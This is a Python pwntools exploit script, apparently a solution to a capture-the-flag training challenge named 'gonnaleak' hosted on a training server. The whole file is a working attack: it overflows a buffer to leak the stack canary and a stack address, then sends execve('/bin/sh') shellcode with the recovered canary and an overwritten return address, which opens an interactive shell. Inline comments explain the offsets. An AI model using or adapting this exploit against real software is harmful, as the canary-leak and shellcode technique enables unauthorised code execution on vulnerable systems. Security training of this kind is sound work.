from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./gonnaleak")
	gdb.attach(r, """
	brva 0x11d4
	c
	""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 2011)


#104 buffer length + 1 byte to overwrite the 0x00 of the canary
stackstuff = b"B"*105
r.send(stackstuff) #No \n at the en
time.sleep(0.1)

r.recvuntil(b"> ")
r.recv(105) #Jump 105 byte in receiving
canary = u64(b"\x00" + r.recv(7)) #canary #u64 convert to unsigned integer of 64bit
print("canary: %#x" % canary) # the '#' inside means that it will be a number of the type 0x 
#and the %x is the hex formatter
#The canary is:  0xaa45c2d1af8bf000


payload_to_leak_stack = b"B" * (104 + 4 * 8) #104 for buffer + 2 variables (1 long) + 1 stack base pointer
r.send(payload_to_leak_stack) #No \n at the en
time.sleep(0.1)


r.recvuntil(b"> ")
r.recv(104 + 4 * 8) #104 for buffer + 2 variables (1 long) + 1 stack base pointer
stack = u64(r.recv(6) + b"\x00\x00") #The two \x00 are needed because the stack is 32 bit (byte?) long
print("stack leak: %#x" % stack) #0x7fffffffdf68 current instruction pointer


# 0x7fffffffdf58 - 0x7fffffffde00
delta = 0x158 #stack - 0x7fffffffde00 (current instruction pointer - buffer address)
print("delta: %#x" % delta)
buffer_position = stack - delta + 1
print("buffer: %#x" % buffer_position)

address = buffer_position
#Attention to exit the loop we need to read a \n be sure we are not putting that \n on our shellcode
shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#We need to add a x90 to overcome the previously mentioned \n problem
shellcode = b"\x90\x90\x90\x90" + shellcode

payload = shellcode.ljust(104, b"\x90") + p64(canary) + b"D"*8 + p64(address)
r.send(payload)
time.sleep(0.1)

r.send(b"\n")

r.interactive()